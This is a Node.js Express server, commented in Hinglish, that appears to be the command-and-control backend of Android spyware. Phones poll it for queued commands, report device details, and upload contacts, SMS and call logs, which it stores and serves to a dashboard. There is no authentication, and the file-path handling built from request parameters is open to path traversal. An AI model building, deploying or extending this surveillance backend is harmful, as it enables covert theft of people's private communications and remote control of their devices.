const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());

// --- YE DO LINE ZAROORI HAIN ---
// Ye JSON data ke liye hai
app.use(bodyParser.json({ limit: '50mb' })); 
// Ye aapke Android (@Field) data ke liye hai
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

app.use(express.static(__dirname));

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

let deviceState = {}; 

// 1. API: Dashboard Status
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 30000 : false;
    res.json({ ...state, isOnline });
});

// 2. API: Send Command (Dashboard se)
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 Command set: ${command} for ${device_id}`);
    res.json({ status: "success" });
});

// 3. API: Phone Status Update (Aapka @Field wala code yahan data bhejega)
app.post('/api/update-status', (req, res) => {
    // Android @Field se data 'req.body' mein hi aata hai
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    if (device_id) {
        deviceState[device_id] = {
            model: model || "Android",
            android_version: android_version || "--",
            battery: battery || 0,
            ringerMode: ringerMode || "normal",
            lastSeen: Date.now(),
            currentCommand: deviceState[device_id]?.currentCommand || "none"
        };
    }
    
    const cmd = deviceState[device_id]?.currentCommand || "none";
    if (cmd !== "none") deviceState[device_id].currentCommand = "none";
    
    console.log(`📡 Status check from ${device_id}. Sending command: ${cmd}`);
    res.json({ command: cmd });
});

// 4. API: Data Upload (@Field Contacts/SMS/Calls)
app.post('/api/upload-data', (req, res) => {
    // Form data se 'device_id', 'type', 'data' nikalna
    const { device_id, type, data } = req.body; 

    if (!device_id || !type || !data) {
        console.log("❌ Incomplete data received");
        return res.status(400).send("Missing Data");
    }

    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(DATA_DIR, fileName);
    
    try {
        // Android String JSON ko parse karke sundar format mein save karna
        let parsedData = (typeof data === 'string') ? JSON.parse(data) : data;
        
        fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        console.log(`📂 [SAVED] ${type} for ${device_id}`);
        res.send("Saved Successfully");
    } catch (err) {
        console.error("❌ Save error:", err);
        res.status(500).send("Error saving data");
    }
});

// 5. API: Dashboard Data Fetch
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server is running with Form-Data support on port ${PORT}`);
});
